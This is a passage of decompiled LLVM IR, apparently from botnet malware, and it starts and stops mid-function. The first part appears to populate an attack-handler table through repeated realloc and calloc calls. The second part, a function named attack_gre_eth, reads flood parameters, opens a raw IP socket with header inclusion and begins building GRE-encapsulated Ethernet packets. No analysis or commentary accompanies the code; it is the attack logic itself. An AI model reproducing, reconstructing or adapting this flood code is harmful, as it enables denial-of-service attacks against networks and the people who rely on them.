  store i8 3, i8* %v5_a674, align 1
  %v0_a678 = load i32, i32* %r1.global-to-local, align 4
  %v3_a678 = mul i32 %v0_a678, 4
  store i32 %v3_a678, i32* %r1.global-to-local, align 4
  %v5_a67c = inttoptr i32 %v2_a66c to i32*
  %v6_a67c = call i32 @realloc(i32* %v5_a67c, i32 %v3_a678, i32 ptrtoint (i32* @global_var_c3ac.89 to i32), i32 3)
  %v2_a680 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a680 = zext i8 %v2_a680 to i32
  store i32 %v3_a680, i32* %r3.global-to-local, align 4
  store i32 %v6_a67c, i32* %r2.global-to-local, align 4
  %v0_a688 = load i32, i32* @r4, align 4
  %v5_a688 = mul nuw nsw i32 %v3_a680, 4
  %v6_a688 = add i32 %v5_a688, %v6_a67c
  %v7_a688 = inttoptr i32 %v6_a688 to i32*
  store i32 %v0_a688, i32* %v7_a688, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a690 = load i32, i32* %r3.global-to-local, align 4
  %v1_a690 = load i32, i32* @r7, align 4
  %v2_a690 = add i32 %v1_a690, %v0_a690
  store i32 %v2_a690, i32* %r3.global-to-local, align 4
  %v1_a698 = trunc i32 %v2_a690 to i8
  %v2_a698 = load i32, i32* @r5, align 4
  %v3_a698 = inttoptr i32 %v2_a698 to i8*
  store i8 %v1_a698, i8* %v3_a698, align 1
  %v0_a69c = load i32, i32* %r2.global-to-local, align 4
  %v1_a69c = load i32, i32* @r6, align 4
  %v2_a69c = inttoptr i32 %v1_a69c to i32*
  store i32 %v0_a69c, i32* %v2_a69c, align 4
  %v2_a6a0 = call i32 @calloc(i32 %v1_a690, i32 8)
  %v2_a6a4 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a6a4 = zext i8 %v2_a6a4 to i32
  store i32 ptrtoint (i32* @global_var_bcb4.91 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6a0, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a6b4 = load i32, i32* @r7, align 4
  %v2_a6b4 = add i32 %v1_a6b4, %v3_a6a4
  store i32 %v2_a6b4, i32* %r1.global-to-local, align 4
  %v2_a6b8 = load i32, i32* @global_var_24318.66, align 4
  %v2_a6bc = inttoptr i32 %v2_a6a0 to i32*
  store i32 ptrtoint (i32* @global_var_bcb4.91 to i32), i32* %v2_a6bc, align 4
  %v3_a6c0 = load i32, i32* @r4, align 4
  %v4_a6c0 = add i32 %v3_a6c0, 4
  %v5_a6c0 = inttoptr i32 %v4_a6c0 to i8*
  store i8 4, i8* %v5_a6c0, align 1
  %v0_a6c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6c4 = mul i32 %v0_a6c4, 4
  store i32 %v3_a6c4, i32* %r1.global-to-local, align 4
  %v5_a6c8 = inttoptr i32 %v2_a6b8 to i32*
  %v6_a6c8 = call i32 @realloc(i32* %v5_a6c8, i32 %v3_a6c4, i32 ptrtoint (i32* @global_var_bcb4.91 to i32), i32 4)
  %v2_a6cc = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a6cc = zext i8 %v2_a6cc to i32
  store i32 %v3_a6cc, i32* %r3.global-to-local, align 4
  store i32 %v6_a6c8, i32* %r2.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r4, align 4
  %v5_a6d4 = mul nuw nsw i32 %v3_a6cc, 4
  %v6_a6d4 = add i32 %v5_a6d4, %v6_a6c8
  %v7_a6d4 = inttoptr i32 %v6_a6d4 to i32*
  store i32 %v0_a6d4, i32* %v7_a6d4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a6dc = load i32, i32* @r7, align 4
  %v2_a6dc = add i32 %v1_a6dc, %v0_a6dc
  store i32 %v2_a6dc, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6dc to i8
  %v2_a6e4 = load i32, i32* @r5, align 4
  %v3_a6e4 = inttoptr i32 %v2_a6e4 to i8*
  store i8 %v1_a6e4, i8* %v3_a6e4, align 1
  %v0_a6e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6e8 = load i32, i32* @r6, align 4
  %v2_a6e8 = inttoptr i32 %v1_a6e8 to i32*
  store i32 %v0_a6e8, i32* %v2_a6e8, align 4
  %v2_a6ec = call i32 @calloc(i32 %v1_a6dc, i32 8)
  %v2_a6f0 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a6f0 = zext i8 %v2_a6f0 to i32
  store i32 ptrtoint (i32* @global_var_b500.93 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6ec, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a700 = load i32, i32* @r7, align 4
  %v2_a700 = add i32 %v1_a700, %v3_a6f0
  store i32 %v2_a700, i32* %r1.global-to-local, align 4
  %v2_a704 = load i32, i32* @global_var_24318.66, align 4
  %v2_a708 = inttoptr i32 %v2_a6ec to i32*
  store i32 ptrtoint (i32* @global_var_b500.93 to i32), i32* %v2_a708, align 4
  %v3_a70c = load i32, i32* @r4, align 4
  %v4_a70c = add i32 %v3_a70c, 4
  %v5_a70c = inttoptr i32 %v4_a70c to i8*
  store i8 5, i8* %v5_a70c, align 1
  %v0_a710 = load i32, i32* %r1.global-to-local, align 4
  %v3_a710 = mul i32 %v0_a710, 4
  store i32 %v3_a710, i32* %r1.global-to-local, align 4
  %v5_a714 = inttoptr i32 %v2_a704 to i32*
  %v6_a714 = call i32 @realloc(i32* %v5_a714, i32 %v3_a710, i32 ptrtoint (i32* @global_var_b500.93 to i32), i32 5)
  %v2_a718 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a718 = zext i8 %v2_a718 to i32
  store i32 %v3_a718, i32* %r3.global-to-local, align 4
  store i32 %v6_a714, i32* %r2.global-to-local, align 4
  %v0_a720 = load i32, i32* @r4, align 4
  %v5_a720 = mul nuw nsw i32 %v3_a718, 4
  %v6_a720 = add i32 %v5_a720, %v6_a714
  %v7_a720 = inttoptr i32 %v6_a720 to i32*
  store i32 %v0_a720, i32* %v7_a720, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a728 = load i32, i32* %r3.global-to-local, align 4
  %v1_a728 = load i32, i32* @r7, align 4
  %v2_a728 = add i32 %v1_a728, %v0_a728
  store i32 %v2_a728, i32* %r3.global-to-local, align 4
  %v1_a730 = trunc i32 %v2_a728 to i8
  %v2_a730 = load i32, i32* @r5, align 4
  %v3_a730 = inttoptr i32 %v2_a730 to i8*
  store i8 %v1_a730, i8* %v3_a730, align 1
  %v0_a734 = load i32, i32* %r2.global-to-local, align 4
  %v1_a734 = load i32, i32* @r6, align 4
  %v2_a734 = inttoptr i32 %v1_a734 to i32*
  store i32 %v0_a734, i32* %v2_a734, align 4
  %v2_a738 = call i32 @calloc(i32 %v1_a728, i32 8)
  %v2_a73c = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a73c = zext i8 %v2_a73c to i32
  store i32 ptrtoint (i32* @global_var_aee4.95 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a738, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a74c = load i32, i32* @r7, align 4
  %v2_a74c = add i32 %v1_a74c, %v3_a73c
  store i32 %v2_a74c, i32* %r1.global-to-local, align 4
  %v2_a750 = load i32, i32* @global_var_24318.66, align 4
  %v2_a754 = inttoptr i32 %v2_a738 to i32*
  store i32 ptrtoint (i32* @global_var_aee4.95 to i32), i32* %v2_a754, align 4
  %v3_a758 = load i32, i32* @r4, align 4
  %v4_a758 = add i32 %v3_a758, 4
  %v5_a758 = inttoptr i32 %v4_a758 to i8*
  store i8 6, i8* %v5_a758, align 1
  %v0_a75c = load i32, i32* %r1.global-to-local, align 4
  %v3_a75c = mul i32 %v0_a75c, 4
  store i32 %v3_a75c, i32* %r1.global-to-local, align 4
  %v5_a760 = inttoptr i32 %v2_a750 to i32*
  %v6_a760 = call i32 @realloc(i32* %v5_a760, i32 %v3_a75c, i32 ptrtoint (i32* @global_var_aee4.95 to i32), i32 6)
  %v2_a764 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a764 = zext i8 %v2_a764 to i32
  store i32 %v3_a764, i32* %r3.global-to-local, align 4
  store i32 %v6_a760, i32* %r2.global-to-local, align 4
  %v0_a76c = load i32, i32* @r4, align 4
  %v5_a76c = mul nuw nsw i32 %v3_a764, 4
  %v6_a76c = add i32 %v5_a76c, %v6_a760
  %v7_a76c = inttoptr i32 %v6_a76c to i32*
  store i32 %v0_a76c, i32* %v7_a76c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a774 = load i32, i32* %r3.global-to-local, align 4
  %v1_a774 = load i32, i32* @r7, align 4
  %v2_a774 = add i32 %v1_a774, %v0_a774
  store i32 %v2_a774, i32* %r3.global-to-local, align 4
  %v1_a77c = trunc i32 %v2_a774 to i8
  %v2_a77c = load i32, i32* @r5, align 4
  %v3_a77c = inttoptr i32 %v2_a77c to i8*
  store i8 %v1_a77c, i8* %v3_a77c, align 1
  %v0_a780 = load i32, i32* %r2.global-to-local, align 4
  %v1_a780 = load i32, i32* @r6, align 4
  %v2_a780 = inttoptr i32 %v1_a780 to i32*
  store i32 %v0_a780, i32* %v2_a780, align 4
  %v2_a784 = call i32 @calloc(i32 %v1_a774, i32 8)
  %v2_a788 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a788 = zext i8 %v2_a788 to i32
  store i32 ptrtoint (i32* @global_var_a850.97 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a784, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r7, align 4
  %v2_a798 = add i32 %v1_a798, %v3_a788
  store i32 %v2_a798, i32* %r1.global-to-local, align 4
  %v2_a79c = load i32, i32* @global_var_24318.66, align 4
  %v2_a7a0 = inttoptr i32 %v2_a784 to i32*
  store i32 ptrtoint (i32* @global_var_a850.97 to i32), i32* %v2_a7a0, align 4
  %v3_a7a4 = load i32, i32* @r4, align 4
  %v4_a7a4 = add i32 %v3_a7a4, 4
  %v5_a7a4 = inttoptr i32 %v4_a7a4 to i8*
  store i8 7, i8* %v5_a7a4, align 1
  %v0_a7a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a7a8 = mul i32 %v0_a7a8, 4
  store i32 %v3_a7a8, i32* %r1.global-to-local, align 4
  %v5_a7ac = inttoptr i32 %v2_a79c to i32*
  %v6_a7ac = call i32 @realloc(i32* %v5_a7ac, i32 %v3_a7a8, i32 ptrtoint (i32* @global_var_a850.97 to i32), i32 7)
  %v2_a7b0 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a7b0 = zext i8 %v2_a7b0 to i32
  store i32 %v3_a7b0, i32* %r3.global-to-local, align 4
  store i32 %v6_a7ac, i32* %r2.global-to-local, align 4
  %v0_a7b8 = load i32, i32* @r4, align 4
  %v5_a7b8 = mul nuw nsw i32 %v3_a7b0, 4
  %v6_a7b8 = add i32 %v5_a7b8, %v6_a7ac
  %v7_a7b8 = inttoptr i32 %v6_a7b8 to i32*
  store i32 %v0_a7b8, i32* %v7_a7b8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = load i32, i32* @r7, align 4
  %v2_a7c0 = add i32 %v1_a7c0, %v0_a7c0
  store i32 %v2_a7c0, i32* %r3.global-to-local, align 4
  %v1_a7c8 = trunc i32 %v2_a7c0 to i8
  %v2_a7c8 = load i32, i32* @r5, align 4
  %v3_a7c8 = inttoptr i32 %v2_a7c8 to i8*
  store i8 %v1_a7c8, i8* %v3_a7c8, align 1
  %v0_a7cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a7cc = load i32, i32* @r6, align 4
  %v2_a7cc = inttoptr i32 %v1_a7cc to i32*
  store i32 %v0_a7cc, i32* %v2_a7cc, align 4
  %v2_a7d0 = call i32 @calloc(i32 %v1_a7c0, i32 8)
  %v2_a7d4 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a7d4 = zext i8 %v2_a7d4 to i32
  store i32 ptrtoint (i32* @global_var_81d0.99 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a7d0, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a7e4 = load i32, i32* @r7, align 4
  %v2_a7e4 = add i32 %v1_a7e4, %v3_a7d4
  store i32 %v2_a7e4, i32* %r1.global-to-local, align 4
  %v2_a7e8 = load i32, i32* @global_var_24318.66, align 4
  %v2_a7ec = inttoptr i32 %v2_a7d0 to i32*
  store i32 ptrtoint (i32* @global_var_81d0.99 to i32), i32* %v2_a7ec, align 4
  %v3_a7f0 = load i32, i32* @r4, align 4
  %v4_a7f0 = add i32 %v3_a7f0, 4
  %v5_a7f0 = inttoptr i32 %v4_a7f0 to i8*
  store i8 10, i8* %v5_a7f0, align 1
  %v0_a7f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a7f4 = mul i32 %v0_a7f4, 4
  store i32 %v3_a7f4, i32* %r1.global-to-local, align 4
  %v5_a7f8 = inttoptr i32 %v2_a7e8 to i32*
  %v6_a7f8 = call i32 @realloc(i32* %v5_a7f8, i32 %v3_a7f4, i32 ptrtoint (i32* @global_var_81d0.99 to i32), i32 10)
  %v2_a7fc = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a7fc = zext i8 %v2_a7fc to i32
  store i32 %v3_a7fc, i32* %r3.global-to-local, align 4
  %v1_a800 = load i32, i32* @r6, align 4
  %v2_a800 = inttoptr i32 %v1_a800 to i32*
  store i32 %v6_a7f8, i32* %v2_a800, align 4
  %v0_a804 = load i32, i32* @r4, align 4
  %v2_a804 = load i32, i32* %r3.global-to-local, align 4
  %v5_a804 = mul i32 %v2_a804, 4
  %v6_a804 = add i32 %v5_a804, %v6_a7f8
  %v7_a804 = inttoptr i32 %v6_a804 to i32*
  store i32 %v0_a804, i32* %v7_a804, align 4
  %v0_a808 = load i32, i32* %r3.global-to-local, align 4
  %v1_a808 = load i32, i32* @r7, align 4
  %v2_a808 = add i32 %v1_a808, %v0_a808
  store i32 %v2_a808, i32* %r2.global-to-local, align 4
  %v1_a810 = trunc i32 %v2_a808 to i8
  %v2_a810 = load i32, i32* @r5, align 4
  %v3_a810 = inttoptr i32 %v2_a810 to i8*
  store i8 %v1_a810, i8* %v3_a810, align 1
  store i32 %v3_a50c, i32* @r4, align 4
  store i32 %v6_a50c, i32* @r5, align 4
  store i32 %v9_a50c, i32* @r6, align 4
  store i32 %v12_a50c, i32* @r7, align 4
  ret i32 %v1_a808

; uselistorder directives
  uselistorder i32 %v1_a808, { 1, 0 }
  uselistorder i32 %v3_a7f4, { 1, 0 }
  uselistorder i32 %v1_a7c0, { 1, 0 }
  uselistorder i32 %v3_a7a8, { 1, 0 }
  uselistorder i32 %v1_a774, { 1, 0 }
  uselistorder i32 %v3_a75c, { 1, 0 }
  uselistorder i32 %v1_a728, { 1, 0 }
  uselistorder i32 %v3_a710, { 1, 0 }
  uselistorder i32 %v1_a6dc, { 1, 0 }
  uselistorder i32 %v3_a6c4, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v3_a678, { 1, 0 }
  uselistorder i32 %v1_a644, { 1, 0 }
  uselistorder i32 %v3_a62c, { 1, 0 }
  uselistorder i32 %v1_a5f8, { 1, 0 }
  uselistorder i32 %v3_a5e0, { 1, 0 }
  uselistorder i32 %v1_a5ac, { 1, 0 }
  uselistorder i32 %v3_a594, { 1, 0 }
  uselistorder i32 %v2_a570, { 1, 0 }
  uselistorder i32 %v6_a54c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a548, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8* bitcast (i8** @global_var_24314.64 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_24315.81 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_24314.64, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_24314.64 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a850 = load i32, i32* @r4, align 4
  %v6_a850 = load i32, i32* @r5, align 4
  %v24_a850 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_a86c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a870 = load i32, i32* @r5, align 4
  store i32 %v0_a870, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a880 = load i32, i32* @r4, align 4
  store i32 %v0_a880, i32* %r0.global-to-local, align 4
  %v5_a884 = inttoptr i32 %v0_a870 to i32*
  %v6_a884 = call i32 @attack_get_opt_int(i32 %v0_a880, i32* %v5_a884, i32 2, i32 0)
  %v1_a890 = urem i32 %v6_a884, 256
  store i32 %v1_a890, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a89c = load i32, i32* @r5, align 4
  store i32 %v0_a89c, i32* %r1.global-to-local, align 4
  %v0_a8a0 = load i32, i32* @r4, align 4
  store i32 %v0_a8a0, i32* %r0.global-to-local, align 4
  %v5_a8a4 = trunc i32 %v6_a884 to i8
  %v6_a8a8 = inttoptr i32 %v0_a89c to i32*
  %v7_a8a8 = call i32 @attack_get_opt_int(i32 %v0_a8a0, i32* %v6_a8a8, i32 3, i32 65535)
  %v0_a8ac = load i32, i32* @r5, align 4
  store i32 %v0_a8ac, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8a8, i32* %fp.global-to-local, align 4
  %v0_a8bc = load i32, i32* @r4, align 4
  store i32 %v0_a8bc, i32* %r0.global-to-local, align 4
  %v4_a8c0 = inttoptr i32 %v0_a8ac to i32*
  %v5_a8c0 = call i32 @attack_get_opt_int(i32 %v0_a8bc, i32* %v4_a8c0, i32 4, i32 64)
  %v1_a8c8 = urem i32 %v5_a8c0, 256
  store i32 %v1_a8c8, i32* %ip.global-to-local, align 4
  %v0_a8cc = load i32, i32* @r5, align 4
  store i32 %v0_a8cc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a8d8 = load i32, i32* @r4, align 4
  store i32 %v0_a8d8, i32* %r0.global-to-local, align 4
  %v6_a8e0 = inttoptr i32 %v0_a8cc to i32*
  %v7_a8e0 = call i32 @attack_get_opt_int(i32 %v0_a8d8, i32* %v6_a8e0, i32 5, i32 1)
  %v1_a8ec = urem i32 %v7_a8e0, 256
  store i32 %v1_a8ec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a8f8 = load i32, i32* @r5, align 4
  store i32 %v0_a8f8, i32* %r1.global-to-local, align 4
  %v0_a8fc = load i32, i32* @r4, align 4
  store i32 %v0_a8fc, i32* %r0.global-to-local, align 4
  %v5_a904 = inttoptr i32 %v0_a8f8 to i32*
  %v6_a904 = call i32 @attack_get_opt_int(i32 %v0_a8fc, i32* %v5_a904, i32 6, i32 65535)
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a904, i32* @r8, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v4_a920 = inttoptr i32 %v0_a90c to i32*
  %v5_a920 = call i32 @attack_get_opt_int(i32 %v0_a91c, i32* %v4_a920, i32 7, i32 65535)
  %v0_a924 = load i32, i32* @r5, align 4
  store i32 %v0_a924, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a920, i32* @r7, align 4
  %v0_a934 = load i32, i32* @r4, align 4
  store i32 %v0_a934, i32* %r0.global-to-local, align 4
  %v4_a938 = inttoptr i32 %v0_a924 to i32*
  %v5_a938 = call i32 @attack_get_opt_int(i32 %v0_a934, i32* %v4_a938, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a948 = load i32, i32* @r5, align 4
  store i32 %v0_a948, i32* %r1.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v4_a950 = inttoptr i32 %v0_a948 to i32*
  %v5_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v4_a950, i32 1, i32 1)
  %v1_a958 = urem i32 %v5_a950, 256
  store i32 %v1_a958, i32* %ip.global-to-local, align 4
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a970 = inttoptr i32 %v0_a95c to i32*
  %v6_a970 = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a970, i32 19, i32 0)
  %v0_a978 = load i32, i32* @r5, align 4
  store i32 %v0_a978, i32* %r1.global-to-local, align 4
  %v2_a97c = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_a97c, i32* %r3.global-to-local, align 4
  store i32 %v6_a970, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a988 = load i32, i32* @r4, align 4
  store i32 %v0_a988, i32* %r0.global-to-local, align 4
  %v4_a98c = inttoptr i32 %v0_a978 to i32*
  %v5_a98c = call i32 @attack_get_opt_int(i32 %v0_a988, i32* %v4_a98c, i32 25, i32 %v2_a97c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a9a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a9a0, i32* %r0.global-to-local, align 4
  %v7_a9a4 = icmp eq i32 %v3_a9a0, -1
  store i1 %v7_a9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9a4, label %dec_label_pc_aeb8, label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a9b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a9b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a9cc = call i32 @__GI_setsockopt(i32 %v3_a9a0, i32 0, i32 3, i32 %v6_a9b8, i32 4)
  store i32 %v5_a9cc, i32* %r0.global-to-local, align 4
  %v7_a9d0 = icmp eq i32 %v5_a9cc, -1
  store i1 %v7_a9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9d0, label %dec_label_pc_aeb0, label %dec_label_pc_a9d8

dec_label_pc_a9d8:                                ; preds = %dec_label_pc_a9b0
  %v0_a9d8 = load i32, i32* @r8, align 4
  %v0_a9dc = load i32, i32* @r7, align 4
  %v0_a9e0 = load i32, i32* %fp.global-to-local, align 4
  %v0_a9e4 = load i32, i32* @r6, align 4
  %v1_a9e4 = urem i32 %v0_a9e4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_a9ec = urem i32 %v0_a9d8, 65536
  store i32 %v3_a9ec, i32* %r3.global-to-local, align 4
  %v3_a9f0 = urem i32 %v0_a9dc, 65536
  store i32 %v3_a9f0, i32* %r4.global-to-local, align 4
  %v0_a9f4 = load i32, i32* @sl, align 4
  %v2_a9f4 = icmp eq i32 %v0_a9f4, 0
  store i1 %v2_a9f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_aa0c = urem i32 %v0_a9e0, 65536
  store i32 %v3_aa0c, i32* @fp, align 4
  br i1 %v2_a9f4, label %dec_label_pc_aec4, label %dec_label_pc_aa1c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_a9d8
  %v3_a9dc = mul i32 %v0_a9dc, 65536
  %v3_a9d8 = mul i32 %v0_a9d8, 65536
  %v0_a9e0.not = or i32 %v0_a9e0, -65536
  %v1_aa20 = xor i32 %v0_a9e0.not, 65535
  %v3_aa24 = mul i32 %v5_a938, 65536
  %v1_aa28 = add i32 %v3_aa24, 4325376
  %tmp73 = udiv i32 %v1_aa28, 256
  %v3_aa3c = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_aa20, 256
  %v3_aa40 = and i32 %tmp74, 65280
  store i32 %v3_aa40, i32* %ip.global-to-local, align 4
  %v1_aa44 = add i32 %v3_aa24, 524288
  %v1_aa4c = add i32 %v3_aa24, 1835008
  %tmp75 = udiv i32 %v1_aa20, 256
  %v4_aa50 = urem i32 %tmp75, 256
  %v5_aa50 = or i32 %v4_aa50, %v3_aa40
  %v4_aa58 = udiv i32 %v1_aa28, 16777216
  %v5_aa58 = or i32 %v3_aa3c, %v4_aa58
  store i32 %v5_aa58, i32* @r8, align 4
  %v3_aa64 = udiv i32 %v1_aa4c, 256
  %tmp76 = mul i32 %v0_a9e0, 256
  %v3_aa68 = and i32 %tmp76, 65280
  store i32 %v3_a9d8, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_a9e0, 256
  %v4_aa78 = urem i32 %tmp77, 256
  %v5_aa78 = or i32 %v4_aa78, %v3_aa68
  store i32 %v5_aa78, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_a9d8, 256
  %v3_aa7c = and i32 %tmp78, 65280
  %v1_aa80 = and i32 %v3_aa64, 65280
  store i32 %v1_aa80, i32* @r6, align 4
  store i32 %v3_a9dc, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_a9dc, 256
  %v3_aa8c = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_a9d8, 256
  %v4_aa90 = urem i32 %tmp80, 256
  %v5_aa90 = or i32 %v4_aa90, %v3_aa7c
  store i32 %v5_aa90, i32* @lr, align 4
  %v4_aa94 = udiv i32 %v1_aa4c, 16777216
  %v5_aa94 = or i32 %v1_aa80, %v4_aa94
  store i32 %v5_aa94, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_a9dc, 256
  %v4_aa98 = urem i32 %tmp81, 256
  %v5_aa98 = or i32 %v4_aa98, %v3_aa8c
  %tmp82 = udiv i32 %v1_aa44, 256
  %v3_aa9c = and i32 %tmp82, 65280
  store i32 %v3_aa9c, i32* @r5, align 4
  %v5_aaa0 = trunc i32 %v5_aa78 to i16
  %v5_aaa8 = trunc i32 %v5_aa94 to i16
  %v4_aab0 = udiv i32 %v1_aa44, 16777216
  %v5_aab0 = or i32 %v3_aa9c, %v4_aab0
  store i32 %v5_aab0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab0c = sext i8 %v5_a8a4 to i32
  %v1_ab18 = trunc i32 %v5_a8c0 to i8
  %sext = mul nuw i32 %v5_aa50, 65536
  %v4_aba4 = sdiv i32 %sext, 65536
  %v2_abd0 = icmp eq i32 %v1_a9e4, 0
  %sext8 = mul nuw i32 %v5_aa90, 65536
  %v4_abf0 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_aa98, 65536
  %v4_abf8 = sdiv i32 %sext9, 65536
  %v1_abb027 = trunc i32 %v4_aba4 to i16
  br label %dec_label_pc_aab8

dec_label_pc_aab8:                                ; preds = %bb85, %dec_label_pc_aa1c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_aac4 = call i32 @calloc(i32 1510, i32 4)
